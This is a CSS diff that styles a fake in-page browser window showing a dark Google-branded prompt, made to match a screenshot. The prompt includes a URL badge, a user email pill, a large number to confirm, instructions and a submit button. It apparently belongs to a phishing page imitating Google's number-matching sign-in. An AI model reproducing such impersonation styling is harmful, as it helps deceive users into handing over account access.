@@ -3480,3 +3480,278 @@ body {
 
 
 
+
+
+/* ========================================================
+   GOOGLE DARK PROMPT STYLES (Screenshot Match)
+   ======================================================== */
+
+.google-modal-window.dark-prompt-window {
+    background: #000000 !important;
+    border: 1px solid #282a2c !important;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.95) !important;
+}
+
+.google-modal-window.dark-prompt-window .google-window-topbar {
+    background: #000000 !important;
+    border-bottom: 1px solid #1a1a1a !important;
+}
+
+.google-modal-window.dark-prompt-window .google-url-badge {
+    background: #18191a !important;
+    border-color: #2f3032 !important;
+}
+
+.google-modal-window.dark-prompt-window .google-url-text {
+    color: #9aa0a6 !important;
+}
+
+.google-modal-window.dark-prompt-window .google-window-close {
+    color: #9aa0a6 !important;
+}
+
+.google-modal-window.dark-prompt-window .google-window-close:hover {
+    background: #202124 !important;
+    color: #ffffff !important;
+}
+
+.google-modal-window.dark-prompt-window .google-window-content {
+    background: #000000 !important;
+    padding: 24px 24px 16px 24px !important;
+}
+
+.google-modal-window.dark-prompt-window .google-modal-footer {
+    display: none !important;
+}
+
+.google-prompt-dark-step {
+    background: #000000 !important;
+    color: #ffffff !important;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Google Sans', sans-serif !important;
+}
+
+.google-dark-prompt-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    text-align: left;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.google-dark-logo-wrapper {
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+}
+
+.google-dark-g-logo {
+    display: block;
+}
+
+.google-dark-prompt-title {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Google Sans', sans-serif !important;
+    font-size: 26px !important;
+    font-weight: 400 !important;
+    color: #ffffff !important;
+    margin: 0 0 12px 0 !important;
+    line-height: 1.25 !important;
+    letter-spacing: -0.2px !important;
+}
+
+.google-dark-prompt-subtitle {
+    font-size: 14px !important;
+    line-height: 1.45 !important;
+    color: #c4c7c5 !important;
+    margin: 0 0 16px 0 !important;
+    font-weight: 400 !important;
+}
+
+.google-dark-link {
+    color: #8ab4f8 !important;
+    text-decoration: none !important;
+    font-weight: 500 !important;
+}
+
+.google-dark-link:hover {
+    text-decoration: underline !important;
+}
+
+.google-dark-user-pill {
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    margin-bottom: 28px !important;
+    padding: 2px 0 !important;
+}
+
+.google-dark-user-icon {
+    flex-shrink: 0;
+    fill: #e3e3e3;
+}
+
+.google-dark-email-text {
+    font-size: 14px !important;
+    color: #e3e3e3 !important;
+    font-weight: 500 !important;
+    white-space: nowrap !important;
+    overflow: hidden !important;
+    text-overflow: ellipsis !important;
+    max-width: 280px !important;
+}
+
+.google-dark-hero-box {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 16px 0 28px 0;
+}
+
+.google-dark-hero-number {
+    font-size: 68px !important;
+    font-weight: 700 !important;
+    color: #ffffff !important;
+    line-height: 1 !important;
+    letter-spacing: 2px !important;
+    text-align: center !important;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
+    user-select: all !important;
+}
+
+.google-dark-instructions-box {
+    width: 100%;
+    margin-bottom: 16px;
+}
+
+.google-dark-instructions-title {
+    font-size: 16px !important;
+    font-weight: 500 !important;
+    color: #ffffff !important;
+    line-height: 1.35 !important;
+    margin: 0 0 10px 0 !important;
+}
+
+.google-dark-instructions-desc {
+    font-size: 13.5px !important;
+    line-height: 1.45 !important;
+    color: #c4c7c5 !important;
+    margin: 0 !important;
+}
+
+.google-dark-instructions-desc strong {
+    color: #ffffff !important;
+    font-weight: 700 !important;
+}
+
+.google-dark-help-row {
+    font-size: 13.5px !important;
+    color: #c4c7c5 !important;
+    margin-bottom: 24px !important;
+    line-height: 1.45 !important;
+}
+
+.google-dark-help-label {
+    color: #e3e3e3 !important;
+}
+
+.google-dark-actions-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    width: 100%;
+    margin-bottom: 20px;
+}
+
+.google-dark-action-btn {
+    background: transparent !important;
+    border: none !important;
+    color: #8ab4f8 !important;
+    font-size: 14px !important;
+    font-weight: 500 !important;
+    text-align: left !important;
+    padding: 0 !important;
+    cursor: pointer !important;
+    transition: opacity 0.15s ease !important;
+}
+
+.google-dark-action-btn:hover {
+    text-decoration: underline !important;
+    opacity: 0.9 !important;
+}
+
+.google-dark-error-msg.hidden {
+    display: none !important;
+}
+
+.google-dark-error-msg {
+    display: flex !important;
+    align-items: center !important;
+    gap: 10px !important;
+    background: rgba(242, 139, 130, 0.12) !important;
+    border: 1px solid rgba(242, 139, 130, 0.4) !important;
+    border-radius: 8px !important;
+    padding: 10px 14px !important;
+    color: #f28b82 !important;
+    font-size: 13px !important;
+    line-height: 1.35 !important;
+    margin-bottom: 16px !important;
+    width: 100% !important;
+    box-sizing: border-box !important;
+}
+
+.google-dark-confirm-row {
+    width: 100%;
+    margin-bottom: 28px;
+}
+
+.google-dark-btn-submit {
+    width: 100% !important;
+    background: #8ab4f8 !important;
+    color: #041e49 !important;
+    border: none !important;
+    border-radius: 100px !important;
+    font-size: 14px !important;
+    font-weight: 600 !important;
+    padding: 12px 24px !important;
+    cursor: pointer !important;
+    transition: background-color 0.15s ease, box-shadow 0.15s ease !important;
+    box-sizing: border-box !important;
+    text-align: center !important;
+}
+
+.google-dark-btn-submit:hover {
+    background: #a8c7fa !important;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3) !important;
+}
+
+.google-dark-footer-bar {
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-top: 16px;
+    border-top: 1px solid #1f1f1f;
+    font-size: 11px;
+    color: #80868b;
+    box-sizing: border-box;
+}
+
+.google-dark-footer-item {
+    color: #9aa0a6;
+    cursor: pointer;
+    white-space: nowrap;
+}
+
+.google-dark-footer-chip {
+    font-size: 10px;
+    color: #9aa0a6;
+    background: #18191a;
+    border: 1px solid #2f3032;
+    padding: 3px 8px;
+    border-radius: 100px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    max-width: 190px;
+}
